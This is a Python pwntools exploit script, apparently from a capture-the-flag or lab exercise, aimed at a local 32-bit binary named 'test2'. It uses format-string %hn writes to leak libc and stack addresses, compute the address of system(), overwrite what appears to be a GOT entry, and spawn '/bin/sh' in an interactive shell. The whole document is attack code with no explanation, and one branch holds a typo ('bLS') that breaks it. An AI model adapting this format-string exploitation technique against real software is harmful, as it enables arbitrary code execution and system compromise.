from pwn import *
def fwritefinal(p,a):
	#stage0: loop
	write = 0
	aH = (a&0xffff0000)>>16
	aL = a&0x0000ffff
	exp = "%" + str(0x921d) + "c%4$hn"
	if (aL > 0x921d):
		write = aL-0x921d
	else:
		write = (0x10000-0x921d)+aL
	exp += "%" + str(write) + "c%13$hn"
	if (aH > aL):
		write = aH-aL
	else:
		write = (0x10000-aL)+aH	
	exp += "%" + str(write) + "c%24$hn"
	p.sendline(exp)
def fwriteto(p,a,b):
	write = 0
	aL = a&0x0000ffff
	if (aL > 0x921d):
		write = aL-0x921d
	else:
		write = (0x10000-0x921d)+aL
	#stage0: loop
	exp = "%" + str(0x921d) + "c%4$hn"
	#stage1: use 22 23 write to 58 60
	exp += "%" + str(write) + "c%22$hn"
	exp += "%2c%23$hn"
	p.sendline(exp)
	#stage1: use 58 60 write to b
	bH = (b&0xffff0000)>>16
	bL = b&0x0000ffff
	exp = "%" + str(0x921d) + "c%4$hn"
	if (bL > 0x921d):
		write = bL-0x921d
	else:
		write = (0x10000-0x921d)+bLS
	exp += "%" + str(write) + "c%58$hn"
	if (bH > bL):
		write = bH-bL
	else:
		write = (0x10000-bL)+bH	
	exp += "%" + str(write) + "c%60$hn"
	p.sendline(exp)
	#stage2: 
def fleak(p):
	exp = "%2$p.%4$p"
	exp += "%" + str(0x921d-21) + "c%4$hn"
	p.sendline(exp)
	leak = p.recv(21+44)
	leak = leak.split('.')
	print leak
	return int(leak[0],16),int(leak[1],16)
def fmain():
	p = process("./test2")
	#gdb.attach("test2")
	#call_vuln = [0x0804,0x921d]
	func_off = 1934784
	sys_off = 250592
	libc_func,stack_base = fleak(p)
	libc_base = libc_func - func_off
	sys_addr = sys_off + libc_base
	print "stack base: ", hex(stack_base)
	print "libc base: ", hex(libc_base)
	fwriteto(p,stack_base+4,0x0804c00c)
	fwriteto(p,stack_base+48,0x0804c00c+2)
	fwritefinal(p,sys_addr)
	p.sendline("/bin/sh")
	p.interactive()
fmain()
